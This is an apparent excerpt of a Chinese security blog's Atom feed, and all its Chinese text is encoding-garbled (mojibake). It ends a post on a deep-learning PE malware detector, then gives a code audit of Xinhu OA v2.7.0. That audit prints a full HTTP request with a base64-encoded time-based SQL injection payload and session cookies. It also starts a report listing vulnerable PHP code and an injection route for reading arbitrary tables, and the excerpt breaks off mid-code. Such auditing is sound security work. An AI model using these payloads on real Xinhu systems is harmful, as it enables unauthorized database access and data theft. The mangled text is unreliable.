id="ğŸ“-å­¦æœ¯è´¡çŒ®"><a href="#ğŸ“-å­¦æœ¯è´¡çŒ®" class="headerlink" title="ğŸ“ å­¦æœ¯è´¡çŒ®"></a>ğŸ“ å­¦æœ¯è´¡çŒ®</h2><h3 id="1-ç†è®ºè´¡çŒ®"><a href="#1-ç†è®ºè´¡çŒ®" class="headerlink" title="1. ç†è®ºè´¡çŒ®"></a>1. ç†è®ºè´¡çŒ®</h3><ul><li><strong>æ¨¡å‹é€‚ç”¨æ€§ç ”ç©¶</strong>ï¼šç³»ç»Ÿè¯„ä¼°äº†ä¸åŒæ·±åº¦å­¦ä¹ æ¶æ„åœ¨æ¶æ„ä»£ç æ£€æµ‹ä¸­çš„é€‚ç”¨æ€§</li><li><strong>ç‰¹å¾é‡è¦æ€§åˆ†æ</strong>ï¼šè¯†åˆ«äº†PEæ–‡ä»¶ä¸­å¯¹æ¶æ„æ€§æ£€æµ‹æœ€é‡è¦çš„ç‰¹å¾</li><li><strong>é¢„å¤„ç†ç­–ç•¥ä¼˜åŒ–</strong>ï¼šç¡®å®šäº†æœ€ä¼˜çš„æ•°æ®é¢„å¤„ç†ç»„åˆ</li></ul><h3 id="2-å®è·µè´¡çŒ®"><a href="#2-å®è·µè´¡çŒ®" class="headerlink" title="2. å®è·µè´¡çŒ®"></a>2. å®è·µè´¡çŒ®</h3><ul><li><strong>å¼€æºæ£€æµ‹ç³»ç»Ÿ</strong>ï¼šæä¾›äº†å®Œæ•´çš„ã€å¯å¤ç°çš„æ¶æ„ä»£ç æ£€æµ‹pipeline</li><li><strong>è‡ªåŠ¨åŒ–å·¥å…·é“¾</strong>ï¼šä»æ ·æœ¬æ”¶é›†åˆ°ç»“æœåˆ†æçš„å…¨è‡ªåŠ¨åŒ–æµç¨‹</li><li><strong>æ€§èƒ½åŸºå‡†</strong>ï¼šä¸ºåç»­ç ”ç©¶æä¾›äº†æ ‡å‡†çš„æ€§èƒ½å¯¹æ¯”åŸºå‡†</li></ul><h3 id="3-æ–¹æ³•åˆ›æ–°"><a href="#3-æ–¹æ³•åˆ›æ–°" class="headerlink" title="3. æ–¹æ³•åˆ›æ–°"></a>3. æ–¹æ³•åˆ›æ–°</h3><ul><li><strong>å¤šæ¨¡å‹é›†æˆæ€è·¯</strong>ï¼šä¸ºæ„å»ºæ›´å¼ºå¤§çš„é›†æˆæ£€æµ‹å™¨å¥ å®šåŸºç¡€</li><li><strong>ç‰¹å¾å·¥ç¨‹ä¼˜åŒ–</strong>ï¼šæå‡ºäº†PEæ–‡ä»¶ç‰¹å¾æå–çš„æœ€ä½³å®è·µ</li><li><strong>è¯„ä¼°æ¡†æ¶</strong>ï¼šå»ºç«‹äº†å…¨é¢çš„æ¨¡å‹è¯„ä¼°ä½“ç³»</li></ul><h2 id="ğŸ”®-æœªæ¥å·¥ä½œæ–¹å‘"><a href="#ğŸ”®-æœªæ¥å·¥ä½œæ–¹å‘" class="headerlink" title="ğŸ”® æœªæ¥å·¥ä½œæ–¹å‘"></a>ğŸ”® æœªæ¥å·¥ä½œæ–¹å‘</h2><h3 id="1-æ¨¡å‹ä¼˜åŒ–"><a href="#1-æ¨¡å‹ä¼˜åŒ–" class="headerlink" title="1. æ¨¡å‹ä¼˜åŒ–"></a>1. æ¨¡å‹ä¼˜åŒ–</h3><ul><li><strong>é›†æˆå­¦ä¹ </strong>ï¼šç»“åˆå¤šä¸ªé«˜æ€§èƒ½æ¨¡å‹æ„å»ºé›†æˆæ£€æµ‹å™¨</li><li><strong>æ³¨æ„åŠ›æœºåˆ¶</strong>ï¼šå¼•å…¥Transformeræ¶æ„æå‡ç‰¹å¾å­¦ä¹ èƒ½åŠ›</li><li><strong>å¯¹æŠ—è®­ç»ƒ</strong>ï¼šå¢å¼ºæ¨¡å‹å¯¹å¯¹æŠ—æ ·æœ¬çš„é²æ£’æ€§</li></ul><h3 id="2-ç‰¹å¾æ‰©å±•"><a href="#2-ç‰¹å¾æ‰©å±•" class="headerlink" title="2. ç‰¹å¾æ‰©å±•"></a>2. ç‰¹å¾æ‰©å±•</h3><ul><li><strong>åŠ¨æ€ç‰¹å¾</strong>ï¼šç»“åˆAPIè°ƒç”¨åºåˆ—ã€è¡Œä¸ºç‰¹å¾</li><li><strong>å›¾ç»“æ„ç‰¹å¾</strong>ï¼šåˆ©ç”¨å‡½æ•°è°ƒç”¨å›¾ã€æ§åˆ¶æµå›¾</li><li><strong>æ·±åº¦ç‰¹å¾</strong>ï¼šä½¿ç”¨é¢„è®­ç»ƒæ¨¡å‹æå–é«˜çº§è¯­ä¹‰ç‰¹å¾</li></ul><h3 id="3-å®é™…éƒ¨ç½²"><a href="#3-å®é™…éƒ¨ç½²" class="headerlink" title="3. å®é™…éƒ¨ç½²"></a>3. å®é™…éƒ¨ç½²</h3><ul><li><strong>å®æ—¶æ£€æµ‹</strong>ï¼šä¼˜åŒ–æ¨¡å‹æ¨ç†é€Ÿåº¦ï¼Œæ”¯æŒå®æ—¶æ£€æµ‹</li><li><strong>å¢é‡å­¦ä¹ </strong>ï¼šæ”¯æŒæ–°æ ·æœ¬çš„åœ¨çº¿å­¦ä¹ æ›´æ–°</li><li><strong>è¾¹ç¼˜è®¡ç®—</strong>ï¼šæ¨¡å‹å‹ç¼©ä¸è¾¹ç¼˜è®¾å¤‡éƒ¨ç½²</li></ul><h2 id="ğŸ“š-å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ"><a href="#ğŸ“š-å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ" class="headerlink" title="ğŸ“š å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ"></a>ğŸ“š å‚è€ƒæ–‡çŒ®ä¸ç›¸å…³å·¥ä½œ</h2><ol><li><strong>PEæ–‡ä»¶æ ¼å¼åˆ†æ</strong>ï¼šMicrosoft PE&#x2F;COFFè§„èŒƒ</li><li><strong>æ¶æ„ä»£ç æ£€æµ‹ç»¼è¿°</strong>ï¼šæ·±åº¦å­¦ä¹ åœ¨æ¶æ„è½¯ä»¶æ£€æµ‹ä¸­çš„åº”ç”¨</li><li><strong>ç‰¹å¾å·¥ç¨‹æ–¹æ³•</strong>ï¼šé™æ€åˆ†æä¸åŠ¨æ€åˆ†ææŠ€æœ¯å¯¹æ¯”</li><li><strong>æ·±åº¦å­¦ä¹ æ¶æ„</strong>ï¼šCNNã€RNNã€Transformeråœ¨åºåˆ—åˆ†æä¸­çš„åº”ç”¨</li></ol><h2 id="ğŸ†-é¡¹ç›®äº®ç‚¹"><a href="#ğŸ†-é¡¹ç›®äº®ç‚¹" class="headerlink" title="ğŸ† é¡¹ç›®äº®ç‚¹"></a>ğŸ† é¡¹ç›®äº®ç‚¹</h2><h3 id="æŠ€æœ¯äº®ç‚¹"><a href="#æŠ€æœ¯äº®ç‚¹" class="headerlink" title="æŠ€æœ¯äº®ç‚¹"></a>æŠ€æœ¯äº®ç‚¹</h3><ul><li>âœ… <strong>å…¨é¢çš„æ¨¡å‹æ¯”è¾ƒ</strong>ï¼š10ç§æ·±åº¦å­¦ä¹ æ¨¡å‹çš„ç³»ç»Ÿæ€§è¯„ä¼°</li><li>âœ… <strong>å®Œæ•´çš„å·¥ç¨‹å®ç°</strong>ï¼šä»æ•°æ®é‡‡é›†åˆ°ç»“æœåˆ†æçš„ç«¯åˆ°ç«¯ç³»ç»Ÿ</li><li>âœ… <strong>é«˜æ£€æµ‹ç²¾åº¦</strong>ï¼šæœ€ä½³æ¨¡å‹è¾¾åˆ°99%çš„æ£€æµ‹å‡†ç¡®ç‡</li><li>âœ… <strong>å¯æ‰©å±•æ¶æ„</strong>ï¼šæ¨¡å—åŒ–è®¾è®¡ï¼Œæ˜“äºæ‰©å±•æ–°æ¨¡å‹å’Œç‰¹å¾</li></ul><h3 id="å­¦æœ¯ä»·å€¼"><a href="#å­¦æœ¯ä»·å€¼" class="headerlink" title="å­¦æœ¯ä»·å€¼"></a>å­¦æœ¯ä»·å€¼</h3><ul><li>ğŸ“Š <strong>å®è¯ç ”ç©¶</strong>ï¼šåŸºäºå¤§è§„æ¨¡çœŸå®æ•°æ®çš„å®éªŒéªŒè¯</li><li>ğŸ”¬ <strong>æ–¹æ³•åˆ›æ–°</strong>ï¼šå¤šç»´åº¦çš„æ¨¡å‹è¯„ä¼°æ¡†æ¶</li><li>ğŸ“ˆ <strong>æ€§èƒ½åŸºå‡†</strong>ï¼šä¸ºé¢†åŸŸç ”ç©¶æä¾›æ ‡å‡†å¯¹æ¯”åŸºå‡†</li><li>ğŸ¯ <strong>å®ç”¨æ€§å¼º</strong>ï¼šå¯ç›´æ¥åº”ç”¨äºå®é™…å®‰å…¨é˜²æŠ¤åœºæ™¯</li></ul><hr><p><strong>é¡¹ç›®çŠ¶æ€</strong>ï¼šâœ… å·²å®Œæˆ<br><strong>ä»£ç å¼€æº</strong>ï¼šâœ… å®Œæ•´å¯å¤ç°<br><strong>æ–‡æ¡£å®Œæ•´åº¦</strong>ï¼šâœ… è¯¦ç»†æŠ€æœ¯æ–‡æ¡£<br><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šğŸ“ å­¦æœ¯ç ”ç©¶ | ğŸ¢ å·¥ä¸šåº”ç”¨ | ğŸ”’ ç½‘ç»œå®‰å…¨</p><hr><p><em>æœ¬é¡¹ç›®ä¸ºç ”ç©¶ç”Ÿå­¦ä½è®ºæ–‡çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå±•ç¤ºäº†æ·±åº¦å­¦ä¹ åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„å®é™…åº”ç”¨ä»·å€¼å’Œå­¦æœ¯ç ”ç©¶æ„ä¹‰ã€‚</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®&quot;&gt;&lt;a href=&quot;#PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®&quot; class=&quot;headerlink&quot; title=&quot;PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®&quot;&gt;&lt;/a&gt;PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ä¿¡å‘¼OA v2.7.0ä»£ç å®¡è®¡</title>
    <link href="https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-10T08:49:07.000Z</published>
    <updated>2025-10-10T09:21:16.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…¬å¼€æ¼æ´"><a href="#å…¬å¼€æ¼æ´" class="headerlink" title="å…¬å¼€æ¼æ´"></a>å…¬å¼€æ¼æ´</h1><p><a href="https://xz.aliyun.com/news/18609">https://xz.aliyun.com/news/18609</a></p><p><a href="https://xz.aliyun.com/news/18575">https://xz.aliyun.com/news/18575</a></p><p>èœç‹—å¤§ä½¬å…¬å¼€äº†ä¸‰ä¸ªSQLæ¼æ´</p><h1 id="è‡ªè¡Œæ¢ç´¢"><a href="#è‡ªè¡Œæ¢ç´¢" class="headerlink" title="è‡ªè¡Œæ¢ç´¢"></a>è‡ªè¡Œæ¢ç´¢</h1><p>é¦–å…ˆå°±æ˜¯ä»–çš„æ€æƒ³æ˜¯ï¼Œæ‰¾ä¸€äº›è§£å¯†ä¹‹åç›´æ¥æ‹¼æ¥æ•°æ®åº“çš„æ“ä½œï¼Œæˆ‘ä»¬é¦–å…ˆè·Ÿç€è¿™ä¸ªæ€è·¯æ¥ã€‚</p><h2 id="å‰å°SQLæ³¨å…¥1"><a href="#å‰å°SQLæ³¨å…¥1" class="headerlink" title="å‰å°SQLæ³¨å…¥1"></a>å‰å°SQLæ³¨å…¥1</h2><p>èœç‹—å¤§ä½¬åªåˆ†æäº†å‚æ•°â€œshoujiâ€,å¯ä»¥çœ‹åˆ°ä¸‹é¢ä¹Ÿæœ‰ä¸€ä¸ªâ€œuseridå‚æ•°â€æ˜¯ç›´æ¥è§£å¯†ç„¶ååˆ°ä¸‹é¢çš„getoneå‡½æ•°ï¼Œè¿™é‡Œçš„å‰ææ˜¯$barr[â€˜successâ€™]ï¼Œä¹Ÿå°±æ˜¯$urs     &#x3D; m(â€˜adminâ€™)-&gt;getone(â€œ<code>mobile</code>&#x3D;â€™$shoujiâ€™ AND <code>status</code>&#x3D;1â€);è¦æ˜¯æ­£ç¡®çš„æ‰‹æœºå·ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165612920.png" alt="image-20251010165612920"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165930343.png" alt="image-20251010165930343"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170148715.png" alt="image-20251010170148715"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170106620.png" alt="image-20251010170106620"></p><p>ä¸å¸¦cookieä¾æ—§ä¹Ÿæ˜¯å¯ä»¥ï¼Œæ‰€ä»¥æ˜¯å‰å°æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170252307.png" alt="image-20251010170252307"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /task.php?m=login|api&amp;a=setwxqy&amp;d=task&amp;shouji=MTU4MDAwMDAwMjM=&amp;userid=MSdhbmQgc2xlZXAoMyktLSA=&amp;num=test&amp;agentid=1&amp;callback=test&quot; HTTP/1.1</span><br><span class="line">Host: 192.168.31.23:85</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1759770582; HMACCOUNT=4160D16E28E71D0D; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1760018993; PHPSESSID=ulo3i8uqc6539kccfednk4bhcd; deviceid=1760022055661; xinhu_mo_adminid=jy0los0uo0llv0uu0zo0loo0llj0loo0ju0zt0lov0uu0ju0ut0zj05; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å…¬å¼€æ¼æ´&quot;&gt;&lt;a href=&quot;#å…¬å¼€æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;å…¬å¼€æ¼æ´&quot;&gt;&lt;/a&gt;å…¬å¼€æ¼æ´&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/18609&quot;&gt;https://xz.aliyun.c</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://250wuyifan.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>å¤ä¹ SQLæ³¨å…¥</title>
    <link href="https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-10-07T17:07:50.000Z</published>
    <updated>2025-10-10T09:03:20.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š"><a href="#ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š" class="headerlink" title="ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA v2.7.0 - è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š"></a>ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA v2.7.0 - è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š</h1><h2 id="ğŸ“‹-æ‰§è¡Œæ‘˜è¦"><a href="#ğŸ“‹-æ‰§è¡Œæ‘˜è¦" class="headerlink" title="ğŸ“‹ æ‰§è¡Œæ‘˜è¦"></a>ğŸ“‹ æ‰§è¡Œæ‘˜è¦</h2><p><strong>æŒ‰ç…§è§„å¾‹ç³»ç»Ÿæ€§æœç´¢ï¼š<code>base64decode/uncrypt</code> â†’ æ— è¿‡æ»¤ â†’ ç›´æ¥SQLæ‹¼æ¥</strong></p><p>å‘ç° <strong>15ä¸ªçœŸæ­£çš„è§£å¯†å‚æ•°SQLæ³¨å…¥æ¼æ´</strong>ï¼</p><hr><h2 id="ğŸ¯-æ ¸å¿ƒæ¼æ´è§„å¾‹"><a href="#ğŸ¯-æ ¸å¿ƒæ¼æ´è§„å¾‹" class="headerlink" title="ğŸ¯ æ ¸å¿ƒæ¼æ´è§„å¾‹"></a>ğŸ¯ æ ¸å¿ƒæ¼æ´è§„å¾‹</h2><p>ä½ æ•™ä¼šæˆ‘çš„è§„å¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‚æ•° â†’ decode/uncrypt â†’ âŒ(æ— iconvsql/filterstr/xssrepstr) â†’ SQLæ‹¼æ¥</span><br></pre></td></tr></table></figure><hr><h2 id="ğŸ”¥-å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰"><a href="#ğŸ”¥-å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰" class="headerlink" title="ğŸ”¥ å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰"></a>ğŸ”¥ å®Œæ•´æ¼æ´åˆ—è¡¨ï¼ˆ15ä¸ªï¼‰</h2><h3 id="ã€1ã€‘inputAction-php-getselectdataAjax-ä¸‡èƒ½SQLæ³¨å…¥-â­â­â­â­â­â­"><a href="#ã€1ã€‘inputAction-php-getselectdataAjax-ä¸‡èƒ½SQLæ³¨å…¥-â­â­â­â­â­â­" class="headerlink" title="ã€1ã€‘inputAction.php - getselectdataAjax() - ä¸‡èƒ½SQLæ³¨å…¥ â­â­â­â­â­â­"></a>ã€1ã€‘inputAction.php - getselectdataAjax() - ä¸‡èƒ½SQLæ³¨å…¥ â­â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/flow/input/inputAction.php:782</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getselectdataAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$actstr</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;actstr&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$acta</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$act</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$actstr</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = <span class="title function_ invoke__">c</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">sqlstore</span>(<span class="variable">$actstr</span>);  <span class="comment">// âš ï¸ æ— è¿‡æ»¤ï¼Œç›´æ¥ä¼ å…¥</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rows</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sqlstoreä»£ç </strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inputChajian.php:399</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlstore</span>(<span class="params"><span class="variable">$actstr1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$acta</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr1</span>);</span><br><span class="line">    <span class="variable">$sqla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$acta</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">arrvalue</span>(<span class="variable">$sqla</span>,<span class="number">2</span>,<span class="string">&#x27;1=1&#x27;</span>);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$wher</span>);  <span class="comment">// âš ï¸ ä»…æ›¿æ¢ $ ä¸º &quot;</span></span><br><span class="line">    <span class="variable">$rowa</span> = <span class="title function_ invoke__">m</span>(<span class="variable">$sqla</span>[<span class="number">0</span>])-&gt;<span class="title function_ invoke__">getall</span>(<span class="variable">$wher</span>,<span class="variable">$sqla</span>[<span class="number">1</span>]);  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rowa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li>å¯æ§è¡¨åã€å­—æ®µã€WHEREæ¡ä»¶</li><li><strong>å¯è¯»å–ä»»æ„è¡¨çš„ä»»æ„æ•°æ®</strong></li></ul><p><strong>è·¯ç”±</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?a=getselectdata&amp;m=input&amp;d=flow&amp;ajaxbool=true&amp;actstr=[base64_payload]</span><br></pre></td></tr></table></figure><hr><h3 id="ã€2ã€‘tableAction-php-savedbupurlAjax-ä»»æ„é…ç½®å†™å…¥-â­â­â­â­"><a href="#ã€2ã€‘tableAction-php-savedbupurlAjax-ä»»æ„é…ç½®å†™å…¥-â­â­â­â­" class="headerlink" title="ã€2ã€‘tableAction.php - savedbupurlAjax() - ä»»æ„é…ç½®å†™å…¥ â­â­â­â­"></a>ã€2ã€‘tableAction.php - savedbupurlAjax() - ä»»æ„é…ç½®å†™å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/system/table/tableAction.php:149</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savedbupurlAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dz&#x27;</span>);</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$dz</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&#x27;option&#x27;</span>)-&gt;<span class="title function_ invoke__">setval</span>(<span class="string">&#x27;dbupurl&#x27;</span>, <span class="variable">$dz</span>);  <span class="comment">// âš ï¸ æ— è¿‡æ»¤ï¼Œç›´æ¥å†™å…¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>setvalä»£ç </strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// optionModel.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setval</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$val</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$isub</span>=<span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;num&#x27;</span> =&gt; <span class="variable">$num</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> =&gt; <span class="variable">$val</span>,  <span class="comment">// âš ï¸ ç›´æ¥æ’å…¥æ•°æ®åº“</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li>å¯å†™å…¥ä»»æ„ç³»ç»Ÿé…ç½®</li><li>å¯èƒ½å¯¼è‡´RCEæˆ–æƒé™ç»•è¿‡</li></ul><hr><h3 id="ã€3ã€‘loginAction-php-jinxwqqtbAction-Mobile-SQLæ³¨å…¥-ï¼ˆåˆ†äº«ï¼‰â­â­â­â­â­"><a href="#ã€3ã€‘loginAction-php-jinxwqqtbAction-Mobile-SQLæ³¨å…¥-ï¼ˆåˆ†äº«ï¼‰â­â­â­â­â­" class="headerlink" title="ã€3ã€‘loginAction.php - jinxwqqtbAction() - Mobile SQLæ³¨å…¥ ï¼ˆåˆ†äº«ï¼‰â­â­â­â­â­"></a>ã€3ã€‘loginAction.php - jinxwqqtbAction() - Mobile SQLæ³¨å…¥ ï¼ˆ<strong>åˆ†äº«</strong>ï¼‰â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/loginAction.php:304</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jinxwqqtbAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="variable">$shouji</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;shouji&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$userid</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userid&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$urs</span>     = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getone</span>(<span 